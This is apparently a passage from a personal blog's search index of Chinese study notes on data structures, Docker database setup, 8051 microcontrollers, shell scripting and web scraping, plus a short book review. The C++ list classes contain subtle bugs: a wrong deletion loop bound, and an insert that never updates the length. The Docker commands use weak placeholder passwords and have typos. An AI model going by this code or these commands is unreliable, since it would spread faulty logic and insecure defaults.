V（G）是顶点集（有穷非空），E（G）表示边集（边有穷集合）</p></blockquote><ul><li>邻接顶点</li><li>顶点的度<ul><li>边的数目</li><li>入度</li><li>出度</li></ul></li><li>子图</li><li>权</li></ul><blockquote><p>数据信息</p></blockquote><ul><li><p>路径</p></li><li><p>路径长度</p><blockquote><p>边之和</p></blockquote></li><li><p>简单路径</p><blockquote><p>除了第一个结点和最后一个结点相同，其他顶点都不相同</p></blockquote></li><li><p>回路（环）</p><blockquote><p>第一个顶点与最后一个顶点相同</p></blockquote></li><li><p>有根的图</p><blockquote><p>从V可以到达任意一个顶点</p></blockquote></li><li><p>连通图</p><blockquote><p>任意两个不同的顶点都连通</p></blockquote></li><li><p>连通分量</p></li><li><p>强连通图</p></li><li><p>强连通分量</p></li></ul><h2 id="图的储存结构">图的储存结构</h2>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 非线性结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>交通灯</title>
      <link href="/2021/06/13/2021-06-13-%E4%BA%A4%E9%80%9A%E7%81%AF/"/>
      <url>/2021/06/13/2021-06-13-%E4%BA%A4%E9%80%9A%E7%81%AF/</url>
      
        <content type="html"><![CDATA[<center>结课作业</center><span id="more"></span><h2 id="功能要求">功能要求</h2><ul><li>利用定时器中断产生倒计时,用数码显示机动车交通灯每个灯次的倒计时。</li><li>每个路口交通变化顺序为：<ul><li>机动车用交通灯：<ul><li>绿灯亮，绿灯闪烁3次，1秒/次</li><li>黄灯闪烁3次,1秒/次,</li><li>红灯亮;</li></ul></li><li>行人用交通灯:<ul><li>绿灯亮,绿灯闪烁3次,1秒/次(与机动车交通灯同步),</li><li>红灯亮(无黄灯闪烁过程),</li><li>绿灯闪烁的同时用蜂鸣器对行人进行提示.</li></ul></li></ul></li><li>设置三个按键，分别是&quot;设置“、 &quot;增大”、“减小“。<ul><li>用外部中断对第一次按下“设置“进行响应，东西方向的数码管闪烁显示该方向绿灯时间，再次按下设置,则东西、南北方向的数码管闪烁切换。</li><li>按下增大、减小,则使相应方向的绿灯时间做出调整，并在数码管上显示。 再次按下设置完成调整。</li></ul></li><li>绿灯时间范围为10秒~20秒</li></ul><h2 id="代码实现">代码实现</h2>]]></content>
      
      
      <categories>
          
          <category> Hardware </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MCS-51 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker启动</title>
      <link href="/2021/06/12/2021-03-06-Docker%E5%90%AF%E5%8A%A8/"/>
      <url>/2021/06/12/2021-03-06-Docker%E5%90%AF%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2 id="聊Docker之前：什么是容器">聊Docker之前：什么是容器</h2><p>容器是<strong>应用层</strong>的抽象，是一个标准化的单元，不同于虚拟机，容器不包含操作系统的一些相关的细节及内容，相对于虚拟机也就更轻量级一些。<a href="https://imgtu.com/i/6nV06s"><img src="https://s3.ax1x.com/2021/03/06/6nV06s.png" alt="6nV06s.png"></a></p><h2 id="不同人眼中的Docker">不同人眼中的Docker</h2><p><strong>开发眼中的Docker</strong></p><ul><li>简化了重复搭建环境的任务</li></ul><p><strong>运维眼中的Docker</strong></p><ul><li>交付系统更加流畅</li><li>伸缩性更好</li></ul><h2 id="Docker-常用命令">Docker 常用命令</h2><h3 id="镜像相关">镜像相关</h3><ul><li>docker pull &lt;image&gt;</li><li>docker search &lt;image&gt;</li></ul><h3 id="容器相关">容器相关</h3><ul><li><p>docker run</p><p><strong>docker run [OPTIONS] IMAGE [COMMAND] [ARG…]</strong></p><ul><li>选项说明<ul><li>-d, 后台运行容器</li><li>-e, 设置环境变量</li><li>–expose/-p 宿主端口：容器端口</li><li>–name, 指定容器名称</li><li>–link , 链接不同容器</li><li>-v 宿主目录：容器目录，挂载磁盘卷</li></ul></li></ul></li><li><p>docker start/stop &lt;容器名&gt;</p></li><li><p>docker ps &lt;容器名&gt;</p></li><li><p>docker logs &lt;容器名&gt;</p></li></ul><h2 id="通过Docker-启动MongoDB">通过Docker 启动MongoDB</h2><p><strong>官方指引</strong></p><ul><li><a href="http://hub.docker.com/_/mongo">http://hub.docker.com/_/mongo</a></li></ul><p><strong>获取镜像</strong></p><ul><li>docker pull mongo</li></ul><p><strong>运行MongoDB</strong></p><ul><li><p>docker exec -it mongo bash</p></li><li><p>docker run --name mongo -p 27017:27017 -v ~/docker-data/mongo:/data/db -e MONGO_INITDB_ROOT_USERNAME=admin-e MONGO_INITDB_ROOT_PASSWORD=admin -d mongo</p></li></ul><h2 id="Spring-对-MongoDB-的支持">Spring 对 MongoDB 的支持</h2><p><strong>MongoDB是一款开源的文档型数据库</strong></p><ul><li><a href="https://www.mongodb.com">https://www.mongodb.com</a></li></ul><p><strong>Spring对MongoDB的支持</strong></p><ul><li>Spring Data MongoDB<ul><li>MongoTemplate</li><li>Repository 支持</li></ul></li></ul><h2 id="Spring-Data-MongoDB-的基本用法">Spring Data MongoDB 的基本用法</h2><p><strong>注解</strong></p><ul><li>@Document</li><li>@Id</li></ul><p><strong>MongoTemplate</strong></p><ul><li>save / remove</li><li>Criteria / Query / Update</li></ul><h2 id="初始化-MongoDB-的库及权限">初始化 MongoDB 的库及权限</h2><p><strong>创建库</strong></p><p>use springbucks;</p><p><strong>创建用户</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java">db<span class="token punctuation">.</span><span class="token function">createUser</span><span class="token punctuation">(</span>    <span class="token punctuation">&#123;</span>        user<span class="token operator">:</span><span class="token string">"springbucks"</span><span class="token punctuation">,</span>        pwd<span class="token operator">:</span><span class="token string">"springbucks"</span><span class="token punctuation">,</span>        roles<span class="token operator">:</span><span class="token punctuation">[</span>            <span class="token punctuation">&#123;</span>role<span class="token operator">:</span><span class="token string">"readWrite"</span><span class="token punctuation">,</span>db<span class="token operator">:</span><span class="token string">"springbucks"</span><span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Spring-Boot-中的MongoDB注解">Spring Boot 中的MongoDB注解</h2><h3 id="Document">@Document</h3><ul><li>标注在实体类上，可以通过collection参数指定这个类对应的文档</li><li>类似于hibernate的entity注解，标明由mongo来维护该表</li></ul><h3 id="Id">@Id</h3><ul><li>主键，<span style = "color:red">不可重复，自带索引</span></li></ul><h2 id="Spring-Data-MongoDB-的-Repository">Spring Data MongoDB 的 Repository</h2><p><strong>@EnableMongoRepository</strong></p><h2 id="Spring-对-Redis-的支持">Spring 对 Redis 的支持</h2><p><strong>Redis</strong>是一款开源的内存KV储存，支持多种数据结构</p><p><strong>Spring 对 Redis 的支持</strong></p><ul><li>Spring Data Redis</li><li>支持的客户端Jedis / Lettuce</li><li>RedisTemplate</li><li>Repository 支持</li></ul><h2 id="Jedis-客户端的简单使用">Jedis 客户端的简单使用</h2><ul><li>Jedis不是线程安全的</li><li>通过JedisPool 获的Jedis 实例</li><li>直接使用Jedis中的方法</li></ul><h2 id="通过Docker启动Redis">通过Docker启动Redis</h2><p><strong>获取镜像</strong></p><ul><li>docker pull redis</li></ul><h2 id="启动Redis">启动Redis</h2><ul><li>docker run --name redis -d -p 6369:6379 redis</li></ul><h2 id="启动MYSQL">启动MYSQL</h2><p><strong>获取镜像</strong></p><ul><li>docker pull mysql</li></ul><p><strong>运行MySQL</strong></p><ul><li>docker run --name mysql -d -p 3306:3306 -v ~/docker- data/mysql:/var/lib/mysql -e MYSQL_DATABASE=springbucks -e MYSQL_USER=springbucks -e MYSQL_PASSWORD=springbucks -e MYSQL_ROOT_PASSWORD=root_password mysql</li></ul><h2 id="杂谈">杂谈</h2><h3 id="镜像">镜像</h3><ul><li>内核上挂载的<code>root</code>文件系统</li><li>分层存储</li></ul><blockquote><p>注意RUN的使用</p></blockquote><h3 id="容器">容器</h3><blockquote><p>镜像的实例</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构</title>
      <link href="/2021/06/08/2021-06-08-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
      <url>/2021/06/08/2021-06-08-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<center>课程学习内容</center><span id="more"></span><h2 id="基本概念">基本概念</h2><h3 id="逻辑结构">逻辑结构</h3><ul><li>集合结构</li><li>线性结构</li><li>树形结构</li><li>图形结构</li></ul><p><a href="https://imgtu.com/i/2BhplQ"><img src="https://z3.ax1x.com/2021/06/08/2BhplQ.png" alt="2BhplQ.png"></a></p><h3 id="储存结构">储存结构</h3><h4 id="顺序结构">顺序结构</h4><ul><li>优点<ul><li>储存密度高</li><li>随机、快速访问</li></ul></li><li>缺点<ul><li>插入/删除，引起大量元素移动</li><li>预分配</li></ul></li></ul><h4 id="链接方式">链接方式</h4><blockquote><p>指针域+数据域</p></blockquote><ul><li>优点<ul><li>逻辑关系由指针域指出，不会引起大量元素移动</li><li>动态变化</li></ul></li><li>缺点<ul><li>无法实现随机访问</li><li>指针域占用一定空间</li></ul></li></ul><h4 id="索引方式">索引方式</h4><ul><li>优点<ul><li>检索快</li></ul></li><li>缺点<ul><li>索引占用较多空间</li></ul></li></ul><h4 id="散列方式">散列方式</h4><blockquote><p>关键字、哈希表</p></blockquote><ul><li>优点<ul><li>检索、增加、删除快</li></ul></li><li>缺点<ul><li>散列函数拉垮的话，储存单元冲突的话，会增加额外的时间和空间的开销</li></ul></li></ul><h3 id="算法">算法</h3><h4 id="基本特征">基本特征</h4><ul><li>有穷性</li><li>确定性</li><li>可行性</li><li>输入</li><li>输出</li></ul><h4 id="评价标准">评价标准</h4><ul><li>时间复杂度</li><li>空间复杂度</li></ul><h2 id="线性表">线性表</h2><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">#include&lt;iostream&gt;#include&lt;fstream&gt;using namespace std;class SeqList&#123;    private:        int Maxsize;        int length;        char * element;    public:        SeqList(int m &#x3D; 10)        &#123;            element &#x3D; new char [m];            Maxsize &#x3D; m;            length &#x3D; 0;        &#125;        ~SeqList()        &#123;            delete [] element;        &#125;         bool isEmpty()        &#123;            return length &#x3D;&#x3D; 0;        &#125;        int getLength()        &#123;            return length;        &#125;        bool find(int i, char &amp;x)        &#123;            if(i &lt; 0 || i &gt; length-1)            &#123;                return false;            &#125;            x&#x3D; element[i];            return true;        &#125;        int search(const char &amp;x)        &#123;            for(int i &#x3D; 0; i &lt; length; i++)            &#123;                if(element[i] &#x3D;&#x3D; x)                &#123;                    return i;                &#125;            &#125;            return -1;        &#125;        bool insert(int i, const char &amp;x)        &#123;            if(i &lt; 0 || i &gt; length)            &#123;                return false;            &#125;            if (length &#x3D;&#x3D; Maxsize)            &#123;                return false;            &#125;            for (int k &#x3D; length -1; k &gt;&#x3D; i; k--)            &#123;                element[k + 1] &#x3D; element[k];            &#125;            element[i] &#x3D; x;            length++;            return true;        &#125;        bool deleteList(int i, char &amp;x)        &#123;            if(find(i, x))            &#123;                for(int k &#x3D; i; k &lt; length - i; k++)                &#123;                    element[k] &#x3D; element[k+1];                &#125;                length--;                return true;            &#125;else            &#123;                return false;            &#125;        &#125;        void clearList()        &#123;            length &#x3D; 0;        &#125;        void output(ostream &amp;out) const        &#123;            for(int i &#x3D; 0; i &lt; length; i++)            &#123;                out &lt;&lt; element[i] &lt;&lt; &quot; &quot;;            &#125;        &#125;        friend std::ostream&amp; operator &lt;&lt; (std::ostream &amp;out, const SeqList &amp;x);&#125;;ostream &amp; operator &lt;&lt; (std::ostream &amp;out, const SeqList &amp; x)&#123;    x.output(out);    return out;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="链表">链表</h2><h3 id="单链表">单链表</h3><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">#include&lt;iostream&gt;using namespace std;class Chain;class Node&#123;    friend class Chain;    private:        char data;        Node * next;&#125;;class Chain&#123;    private:        Node * head;        int length;    public:        Chain()        &#123;            head &#x3D; new Node;            head -&gt; next &#x3D; 0;            length &#x3D; 0;        &#125;        bool isEmpty()        &#123;            return length &#x3D;&#x3D; 0;        &#125;        int getLength()        &#123;            return length;        &#125;        bool find(int i, char &amp;x)        &#123;            if(i &lt; 0 || i &gt; length -1)            &#123;                return false;            &#125;            Node *p &#x3D; head-&gt;next;            int k &#x3D; 0;            while(k &lt; i)            &#123;                p &#x3D; p-&gt;next;                k++;            &#125;            x &#x3D; p-&gt;data;            return true;        &#125;        int search(const char &amp;x)        &#123;            Node * p &#x3D; head-&gt;next;            int i &#x3D; 0;            while(p !&#x3D; 0 )            &#123;                if(p -&gt; data &#x3D;&#x3D; x)                &#123;                    return i;                &#125;                p &#x3D; p-&gt;next;                i++;            &#125;            return -1;        &#125;        bool insert(int i, const char &amp;x)        &#123;            if(i &lt;0 || i &gt; length)            &#123;                return false;            &#125;            Node *p &#x3D; head;            int k &#x3D; 0;            while(k &lt;&#x3D; i-1)            &#123;                p &#x3D; p-&gt;next;                k++;            &#125;            Node * q;            q &#x3D; new Node;            q-&gt;data &#x3D; x;            q-&gt;next &#x3D; p -&gt; next;            p-&gt;next&#x3D;q;            return true;        &#125;        bool deleteD(int i, char &amp;x)        &#123;            if(i &lt; 0 || i &gt; length -1)            &#123;                return false;            &#125;            Node *p &#x3D; head;            for(int k &#x3D; 0; k &lt; i; k++)            &#123;                p &#x3D; p-&gt;next;            &#125;            Node * q &#x3D; p-&gt;next;            x &#x3D; q-&gt;data;            p-&gt;next &#x3D; q-&gt;next;            delete q;            length--;            return true;        &#125;        void clearList()        &#123;            Node *p &#x3D; head-&gt;next, *q;            while(p !&#x3D; 0)            &#123;                q &#x3D; p;                p &#x3D; p-&gt;next;                delete q;            &#125;            head-&gt;next &#x3D; 0;            length &#x3D; 0;        &#125;        void output (ostream &amp; out) const        &#123;            Node *p &#x3D; head-&gt;next;            while(p !&#x3D; 0)            &#123;                out &lt;&lt; p-&gt;data &lt;&lt; &quot; &quot;;                p &#x3D; p-&gt;next;            &#125;        &#125;        friend ostream&amp; operator &lt;&lt; (ostream &amp;out, const Chain &amp;x)        &#123;            x.output(out);            return out;        &#125;        ~Chain()        &#123;            clearList();            delete head;            head &#x3D; 0;        &#125;&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="单循环链表">单循环链表</h3><blockquote><p>尾指针表示单循环链表</p></blockquote><p><a href="https://imgtu.com/i/2BWIrn"><img src="https://z3.ax1x.com/2021/06/08/2BWIrn.png" alt="2BWIrn.png"></a></p><h3 id="双链表">双链表</h3><p><a href="https://imgtu.com/i/2BWOGF"><img src="https://z3.ax1x.com/2021/06/08/2BWOGF.png" alt="2BWOGF.png"></a></p><h3 id="双循环链表">双循环链表</h3><p><a href="https://imgtu.com/i/2BWjxJ"><img src="https://z3.ax1x.com/2021/06/08/2BWjxJ.png" alt="2BWjxJ.png"></a></p><h2 id="栈">栈</h2><blockquote><p>后进先出，栈空 top = -1</p></blockquote><h3 id="顺序存储结构">顺序存储结构</h3><p><a href="https://imgtu.com/i/2cRA1K"><img src="https://z3.ax1x.com/2021/06/09/2cRA1K.png" alt="2cRA1K.png"></a></p><h3 id="链式存储结构">链式存储结构</h3><p><a href="https://imgtu.com/i/2cRMtI"><img src="https://z3.ax1x.com/2021/06/09/2cRMtI.png" alt="2cRMtI.png"></a></p><h2 id="队列">队列</h2><blockquote><p>先进先出</p></blockquote><h3 id="顺序存储结构-2">顺序存储结构</h3><blockquote><p>元素入队，(rear+1)%maxsize;元素出队，(front+1)%maxsize</p></blockquote><ul><li>队满条件：(rear+1)%maxsize = front</li><li>队空条件：rear = front</li></ul><h3 id="链式存储结构-2">链式存储结构</h3><p><img src="C:%5CUsers%5CAmorFati%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210609214113215.png" alt="image-20210609214113215"></p><h2 id="数组">数组</h2><blockquote><p>一旦建立，个数以及元素之间的关系便不再变化</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 线性结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Inherit the Stars</title>
      <link href="/2021/05/26/2021-05-26-Inherit%20the%20Stars/"/>
      <url>/2021/05/26/2021-05-26-Inherit%20the%20Stars/</url>
      
        <content type="html"><![CDATA[<center>下周听说课，有任务安排，主题随意，正好今天下午拜读了《星之继承者》</center><p>​<span id="more"></span></p><p>​Today I want to introduce a book to you: “Inherit the Stars”.</p><p>​This is a story about human beings marching towards the unknown.</p><p>​The story is developed following the scientific research started after the discovery of Charlie, as the ancient human found on the Moon gets nicknamed. It’s a story of archeological mysteries and the attempt of the scientists who study them to find answers based on information that appears increasingly contradicting.</p><p>​The research is based on the existence of an ancient race of humans that get called Lunarians. Charlie proves that there was once an advanced civilization but his discovery leads scientists to ask a series of questions. However, every answer seems to contradict the result of some of the previous analyzes. But at the end of the first part, they deduced a shocking conclusion.</p><p>​I want to quote a passage from the book as the end.</p><blockquote><p>Most animals, when in a hopeless situation will resign themselves to fate and perish in ignominy. Man, on the other hand, does not know how to give in. He is capable of summoning up reserves of stubbornness and resilience that are without parallel on his planet.</p><p>大部分动物在陷入绝境时都会向命运屈服，最终落得一个一命呜呼的下场。而人类呢？人类从来不知道屈服为何物，他们总能鼓起勇气，不折不挠地抗争下去。论顽强和固执，他们绝对是无与伦比的。</p></blockquote><p>PS： When I finished reading it, I suddenly thought of the lines in “Interstellar”: ''We used to look up at the stars and think about our position in the universe. And now we only look down, worrying that we won’t find a place to bury ourselves after we die. ‘’ I don’t hope that human beings will come to such a situation.</p>]]></content>
      
      
      <categories>
          
          <category> Essays </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Shell脚本学习</title>
      <link href="/2021/05/24/2021-05-24-Shell%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/05/24/2021-05-24-Shell%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<center>HiSaprk官方给的一些资料里有些Shell脚本</center><span id="more"></span><h2 id="入门">入门</h2><h3 id="Shell怎么执行的">Shell怎么执行的</h3><blockquote><p>在大多数脚本文件中，第一行都会加<code>#！/bin/sh -[option]</code></p></blockquote><p>反正就是指定一个可执行的文件的路径，不加的话，Shell会无法识别文件（毕竟没有任何拓展名），那么这就一定是个Shell脚本，会启动一个新的<code>/bin/sh</code></p><blockquote><p>所以我们在编写Shell脚本的时候，加这行的意义何在</p></blockquote><ul><li>现在大多有好几个Shell</li><li>毕竟，你可以指定其他的解释器</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#! &#x2F;usr&#x2F;bin&#x2F;python3.7print(&quot;hello, world&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="Shell的基本元素">Shell的基本元素</h2><ul><li><p>命令与参数</p><ul><li><p>变量</p><ul><li>命名通常以_或字母开头<strong>中间无空格</strong></li><li>调用变量的值，需要<code>$filename</code></li><li>双引号的使用<ul><li>含空格</li><li>连接变量</li></ul></li></ul></li><li><p>echo输出</p><blockquote><p>man echo 查询，还是<code>printf</code>香</p></blockquote></li></ul></li><li><p>I/O重定向</p><ul><li><p>&lt; 输入</p></li><li><p>&gt;输出</p></li><li><p>管道</p><p><code>program1 | program2 </code></p><p>将program1的标准输出，改为program2的标准输入</p></li></ul></li></ul><h2 id="其他">其他</h2><h3 id="添加环境变量">添加环境变量</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">PATH&#x3D; $PATH:path<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Shell </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>51单片机选修</title>
      <link href="/2021/05/20/2021-05-20-MCS-51%20microcontroller/"/>
      <url>/2021/05/20/2021-05-20-MCS-51%20microcontroller/</url>
      
        <content type="html"><![CDATA[<p>电路垃圾的学习</p><span id="more"></span><h2 id="常用原件记录">常用原件记录</h2><ul><li><p>数码管</p><ul><li>SEG</li><li>7SEG-MPX1-CA  8个引脚</li><li>7SEG-MPX4-CA 多位数码管</li><li>7SEG-COM-ANODE（共阳</li></ul></li><li><p>上拉电阻</p><ul><li>RESPACK-8</li></ul></li><li><p>锁存器</p><ul><li>74HC573</li></ul></li><li><p>三极管</p><ul><li>NPN</li></ul></li><li><p>电阻</p><ul><li><p>10WATT100R</p></li><li><p>排阻</p><ul><li>RES16DIPIS</li></ul></li></ul></li><li><p>按键</p><ul><li>button</li></ul></li><li><p>电容</p><ul><li>C1808C161MZGACTU</li></ul></li><li><p>拓展芯片</p><ul><li>拓展输出<ul><li>CD4094</li><li>74LS164</li></ul></li><li>拓展输入<ul><li>CD4014</li><li>74LS165</li></ul></li></ul></li></ul><h2 id="学习过程中的问题">学习过程中的问题</h2><h3 id="为什么数据类型多用unsigned"><a href="https://www.zhihu.com/question/404008117">为什么数据类型多用unsigned</a></h3><ul><li><p><span style = "color:red">省内存</span></p></li><li><p>C51设计之初，不支持有符号操作</p><blockquote><p>前人在学习时，早期的代码示例是unsigned，后人学习也就成了习惯</p></blockquote></li></ul><h3 id="sbit和bit-的区别"><a href="https://zhuanlan.zhihu.com/p/121544192">sbit和bit 的区别</a></h3><ul><li>都是C51的拓展的变量类型</li><li>bit<ul><li>动态分配</li><li>外部或内部</li><li>更像是数据类型</li></ul></li><li>sbit<ul><li>绝对地址</li><li>只能外部</li><li>主要用于寄存器</li><li>为分配内存空间的变量取一个别名</li></ul></li></ul><blockquote><p>bit i = 0；意思就是在内存中划一块空间给i，让他存储0这个数据位，没有这个语句之前，内存里面任何一个地址空间都没有i这个变量存在。</p><p>sbit Flag = P0^1；意思就是给P0^1取一个别名，ta叫做Flag，没有这个语句之前，P0^1这个数据位已经有一个明确的地址空间，ta就是0x80的第二位数据位。</p></blockquote><h3 id="多分支管理"><a href="https://blog.csdn.net/weixin_41359455/article/details/85485589">多分支管理</a></h3><ul><li>基础版本同时需要扩展多种验证方案的工程</li><li>相同框架同时扩展多种组合需求方案的工程</li><li>一套软件有不同配置需求的工程</li><li>同个业务逻辑，不同底层驱动的工程</li><li>这会让你的作品看起来更由条理，更容易管理</li></ul><h3 id="IO端口">IO端口</h3><ul><li><p>P0端口：引脚P0.0~P0.7，输入八路信号，输出八路信号</p><ul><li>I/O输出时，输出0为低电平，输出1为高阻态</li><li>I/O输入时，不需要接上拉电阻，但要先置1，使端口处于高阻浮空状态</li></ul></li><li><p>P1端口</p><ul><li><p>当时老师给的资料也没相关的介绍</p></li><li><p>反正，我理解的就是</p><table><thead><tr><th>输出</th><th>输入</th></tr></thead><tbody><tr><td>1亮 0不亮</td><td>0亮 ，1不亮</td></tr></tbody></table></li></ul></li><li><p>P2端口：引脚P2.0~P2.7，输入8路信号，输出8路信号</p><ul><li>当使用外部存储器时，还可以与P0口配合使用，作为16位地址总线的高8位</li></ul></li><li><p>P3端口：引脚P3.0~P3.7，输入8路信号，输出8路信号</p><ul><li>P3.0，RXD，串行数据接收</li><li>P3.1，TXD，串行数据发送</li><li>P3.2，INT0，外部中断0申请P3.3，INT1，外部中断1申请</li><li>P3.4，T0，定时器/计数器0计数输入</li><li>P3.5，T1，定时器/计数器1计数输入</li><li>P3.6，WR，外部RAM写选通</li><li>P3.7，RD，外部RAM读选通</li></ul></li></ul><h3 id="锁存器，静态显示，动态显示"><a href="https://share.mubu.com/doc/6Vqkhu_Xmf9">锁存器，静态显示，动态显示</a></h3><blockquote><p>幕布内容来源于网络</p></blockquote><h3 id="中断"><a href="https://share.mubu.com/doc/534yg6GQt99">中断</a></h3><blockquote><p>图片源于肖谧老师的课件</p></blockquote><h3 id="计时器-定时器"><a href="https://share.mubu.com/doc/7xPtVI41cl9">计时器/定时器</a></h3><blockquote><p><a href="https://www.cnblogs.com/hughdong/p/6878070.html">参考资料</a></p></blockquote><h3 id="串口通信"><a href="https://share.mubu.com/doc/4hD0L_bnvhp">串口通信</a></h3><h2 id="注意事项">注意事项</h2><h3 id="新建项目">新建项目</h3><blockquote><p>Keil uVision5 + VScode，VScode插件：keil assistant + C++/C + …</p></blockquote><ul><li><p>Keil新建项目，勾选生成hex选项，添加源文件</p><blockquote><p>不在keil中加的话，build的时候可能会有warning，生成的hex文件，在Proteus中也无法使用</p><p>至于具体原因自己也没有复盘😴</p></blockquote></li></ul><h3 id="命名规范">命名规范</h3><ul><li><p>变量命名</p><ul><li>见名知意（少用拼音</li><li>每个单词首字母缩写（可缩写</li><li>风格统一（我可能采取下划线的方式）</li></ul></li><li><p>函数命名</p><ul><li><p>专有名词全部大写</p></li><li><p>函数名_功能</p><p><code>char UART_IsTxBuffFull();</code></p></li></ul></li><li><p>代码风格</p><p>全靠编译器</p></li></ul><h3 id="烧录">烧录</h3><ul><li><p><code>stc-isp</code>烧录时，一直显示“正在检测目标单片机”</p><p>直接冷启动，引导区到程序区</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Hardware </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MCS-51 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spider 入门</title>
      <link href="/2021/05/15/2021-05-15-Spider-%E5%85%A5%E9%97%A8/"/>
      <url>/2021/05/15/2021-05-15-Spider-%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<center>初步学会抓取网页元素</center><span id="more"></span><h2 id="又是HTTP">又是HTTP</h2><blockquote><p>F12大法</p></blockquote><ul><li>Network面板</li></ul><table><thead><tr><th>列名</th><th>看法</th></tr></thead><tbody><tr><td>name</td><td>看样子是截取了主域名后的一部分</td></tr><tr><td>status</td><td>状态码（200，500…）</td></tr><tr><td>type</td><td>文档类型 为啥HTML非得搞个document</td></tr><tr><td>initiator</td><td>请求源   看不懂</td></tr><tr><td>size</td><td>大小，如果有cache的话，会有标识</td></tr><tr><td>time</td><td>响应时间</td></tr><tr><td>waterfall</td><td>可视化？</td></tr></tbody></table><ul><li><p>Header</p><p>请求和响应比较详细的内容</p></li></ul><h3 id="请求">请求</h3><blockquote><p>CRUD</p></blockquote><ul><li>请求头</li></ul><p>cookies, UA, type之类的玩意</p><ul><li>请求体</li></ul><p>表单数据，正好这几天刚写完了表单</p><p>注意类型</p><table><thead><tr><th>Content-Type</th><th>提交数据的方式</th></tr></thead><tbody><tr><td>application/x-www-form-urlencoded</td><td>表单数据</td></tr><tr><td>multipart/form-data</td><td>表单文件上传</td></tr><tr><td>application/json</td><td>序列化json数据</td></tr><tr><td>text/xml</td><td>XML数据</td></tr></tbody></table><h3 id="响应">响应</h3><ul><li>响应头</li></ul><p>时间（create,update,outdate）类型，cookie</p><ul><li>响应体</li></ul><p>正主来了，我们要解析的对象</p><h2 id="网页基础">网页基础</h2><h3 id="HTML">HTML</h3><ul><li><p>标签</p></li><li><p>节点</p></li></ul><h3 id="CSS">CSS</h3><blockquote><p>加buff</p></blockquote><ul><li><p>使用link标签与html配合</p></li><li><p>CSS选择器（还是比较喜欢用xpath）</p></li></ul><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">#id .class .class_inner</span><span class="token punctuation">&#123;</span><span class="token property">position</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>//页面布局<span class="token property">bottom</span><span class="token punctuation">:</span> 40px<span class="token punctuation">;</span>//距离底边距离<span class="token property">width</span><span class="token 